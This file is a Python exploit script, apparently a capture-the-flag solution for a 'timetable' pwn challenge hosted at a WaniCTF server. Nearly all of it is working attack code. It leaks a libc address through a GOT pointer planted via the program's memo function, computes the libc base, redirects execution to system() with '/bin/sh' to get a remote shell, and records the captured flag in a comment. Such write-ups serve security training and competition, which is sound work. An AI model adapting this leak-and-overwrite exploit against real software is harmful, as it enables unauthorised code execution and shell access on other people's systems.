#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'timetable-pwn.wanictf.org', 'port':9008})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    tt = TimeTable(conn, '/bin/sh\x00', 114, 514)

    tt.reg_m(4)
    tt.memo(b'FRI 3', p64(addr_got_main))

    conn.sendlineafter(b'>', b'2')
    conn.recvuntil(b'The World of Intellect - ')
    addr_libc_main = u(conn.recv(6))
    conn.sendlineafter(b'>', b'0')

    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    tt.memo(b'FRI 3', p64(binf.address)+p64(addr_libc_system))
    tt.reg_e(1)

class TimeTable:
    def __init__(self, conn, name, sid, major):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

        self.sendlineafter(b'name : ', name)
        self.sendlineafter(b'id : ', str(sid).encode())
        self.sendlineafter(b'major : ', str(major).encode())

    def reg_m(self, n):
        self.sendlineafter(b'>', b'1')
        self.sendlineafter(b'>', str(n).encode())

    def reg_e(self, n):
        self.sendlineafter(b'>', b'2')
        self.sendlineafter(b'>', str(n).encode())

    def see(self, time):
        self.sendlineafter(b'>', b'3')
        self.sendlineafter(b'>', time)

    def memo(self, time, memo):
        self.sendlineafter(b'>', b'4')
        self.sendlineafter(b'>', time)
        self.sendafter(b'CLASS\n', memo)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # FLAG{Do_n0t_confus3_mandatory_and_el3ctive}

if __name__=='__main__':
    main()

#==========
